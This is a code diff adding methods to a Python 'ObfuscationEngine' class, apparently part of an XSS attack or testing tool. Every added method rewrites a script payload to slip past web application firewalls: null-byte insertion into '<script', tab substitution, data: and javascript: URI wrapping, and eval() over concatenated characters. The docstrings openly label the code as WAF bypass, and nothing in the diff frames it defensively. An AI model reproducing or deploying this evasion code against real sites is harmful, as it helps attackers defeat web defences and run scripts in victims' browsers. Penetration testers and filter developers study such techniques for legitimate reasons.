@@ -69,3 +69,40 @@ class ObfuscationEngine:
             result = result.replace(func, obfuscated)
         
         return result
+    
+    @staticmethod
+    def inject_null_bytes(payload: str) -> str:
+        """Inject null bytes for WAF bypass"""
+        # Insert null bytes between characters
+        if '<script' in payload.lower():
+            return payload.replace('<script', '<scr\\x00ipt')
+        return payload.replace('<', '<\\x00')
+    
+    @staticmethod
+    def use_tab_variations(payload: str) -> str:
+        """Use tab characters for WAF bypass"""
+        # Replace spaces with tabs
+        return payload.replace(' ', '\\t').replace('>', '>\\t')
+    
+    @staticmethod
+    def use_data_uri(payload: str) -> str:
+        """Convert to data: URI scheme"""
+        import base64
+        # Encode payload in data URI
+        encoded = base64.b64encode(payload.encode()).decode()
+        return f'data:text/html;base64,{encoded}'
+    
+    @staticmethod
+    def use_javascript_uri(payload: str) -> str:
+        """Convert to javascript: URI scheme"""
+        # Clean payload for javascript: protocol
+        clean_payload = payload.replace('<script>', '').replace('</script>', '')
+        return f'javascript:{clean_payload}'
+    
+    @staticmethod
+    def use_eval_obfuscation(payload: str) -> str:
+        """Use eval-based obfuscation"""
+        # Wrap payload in eval with string obfuscation
+        parts = [f"'{char}'" for char in payload]
+        concatenated = '+'.join(parts)
+        return f'eval({concatenated})'
